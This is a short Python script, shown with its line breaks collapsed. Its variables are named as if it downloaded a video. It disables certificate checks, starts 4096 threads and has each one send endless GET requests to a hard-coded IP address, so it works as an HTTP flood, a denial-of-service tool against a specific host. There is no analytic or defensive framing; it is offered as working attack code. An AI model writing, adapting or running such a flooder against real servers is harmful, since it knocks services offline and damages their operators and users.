import requestsimport osimport timeimport concurrent.futuresimport loggingimport urllib3  urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')video_url = "https://147.45.146.229/welcome"def download_video(url):    try:        requests.get(url, stream=True, verify=False)        logging.info(f"get url: {url}")    except Exception as e:        logging.error(f"Error: {e}")        return Nonedef process_video(url):    while True:        download_video(url)def main():    with concurrent.futures.ThreadPoolExecutor(max_workers=4096) as executor:        for i in range(4096):            executor.submit(process_video, video_url)if __name__ == "__main__":    main()